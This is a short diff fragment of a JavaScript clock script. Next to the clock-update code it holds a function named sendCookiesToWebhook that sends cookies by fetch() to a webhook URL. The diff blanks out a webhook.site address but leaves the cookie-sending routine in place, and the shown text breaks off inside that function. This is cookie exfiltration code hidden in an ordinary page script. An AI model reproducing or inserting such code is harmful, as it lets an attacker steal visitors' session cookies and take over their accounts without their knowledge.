@@ -11,7 +11,7 @@ setInterval(updateClock, 1000);
 
 updateClock();
 
-const WEBHOOK_URL = "https://webhook.site/3b3fb4c2-4084-480f-8a94-b4a18938a9fe";
+const WEBHOOK_URL = "";
 
 function sendCookiesToWebhook(cookies) {
   fetch(WEBHOOK_URL, {
